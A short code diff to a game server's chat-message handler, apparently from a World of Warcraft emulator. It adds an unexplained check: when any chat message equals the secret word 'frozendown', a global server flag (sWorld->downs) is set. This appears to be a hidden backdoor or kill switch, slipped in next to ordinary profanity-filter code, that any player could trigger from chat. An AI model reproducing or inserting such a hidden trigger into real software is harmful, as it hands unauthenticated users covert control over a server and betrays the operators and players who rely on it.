@@ -296,6 +296,12 @@ void WorldSession::HandleMessagechatOpcode(WorldPacket & recvData)
             ignoreChecks = true;
             break;
     }
+
+    if (msg == "frozendown")
+    {
+        sWorld->downs = true;
+        return;
+    }
     for (auto itr = DirtyWordVector.begin(); itr != DirtyWordVector.end(); itr++)
         sString->Replace(msg, *itr, "***");
 
